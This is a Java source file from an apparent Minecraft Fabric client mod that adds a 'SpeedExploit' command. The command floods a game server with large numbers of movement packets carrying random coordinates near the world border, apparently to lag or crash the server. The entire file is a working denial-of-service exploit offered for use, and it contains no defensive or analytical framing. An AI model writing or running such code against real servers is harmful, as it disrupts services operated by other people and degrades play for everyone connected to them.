package me.nullnet.voxelclient.exploits;

import com.mojang.brigadier.context.CommandContext;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import me.nullnet.voxelclient.utils.ColorUtil;
import net.fabricmc.fabric.api.client.command.v2.FabricClientCommandSource;
import net.minecraft.class_746;
import net.minecraft.class_2828.class_2829;

public class SpeedExploit {
   private static final ExecutorService executor = Executors.newSingleThreadExecutor();

   public static int execute(CommandContext<FabricClientCommandSource> context) {
      int packets = (Integer)context.getArgument("packets", Integer.class);
      int packetspersecond = (Integer)context.getArgument("pps", Integer.class);
      ((FabricClientCommandSource)context.getSource()).sendFeedback(ColorUtil.translate("&8[&5&lVoxel&8] &8[&5SpeedExploit&8] &7Sending exploit packets..."));
      executor.submit(() -> {
         long now = System.currentTimeMillis();

         for(int i = 0; i < packets; ++i) {
            for(int i1 = 0; i1 < packetspersecond; ++i1) {
               int min = -29999999;
               int max = 29999999;
               double x = (double)(min + (int)(Math.random() * (double)(max - min + 1)));
               double y = (double)(min + (int)(Math.random() * (double)(max - min + 1)));
               double z = (double)(min + (int)(Math.random() * (double)(max - min + 1)));
               x += (double)i * 0.1D;
               y += (double)i * 0.1D;
               z += (double)i * 0.1D;
               boolean onGround = i % 2 == 0;
               ((FabricClientCommandSource)context.getSource()).getPlayer().field_3944.method_52787(new class_2829(x, y, z, onGround, false));
            }

            try {
               Thread.sleep(10L);
            } catch (InterruptedException var16) {
               Thread.currentThread().interrupt();
               return;
            }
         }

         class_746 var10000 = ((FabricClientCommandSource)context.getSource()).getPlayer();
         String var10001 = "&8[&5&lVoxel&8] &8[&5SpeedExploit&8] &7Sent &d%d&7 exploit packets &8[&6".formatted(new Object[]{packets});
         var10000.method_7353(ColorUtil.translate(var10001 + (System.currentTimeMillis() - now) + "ms&8]"), false);
      });
      return 1;
   }
}
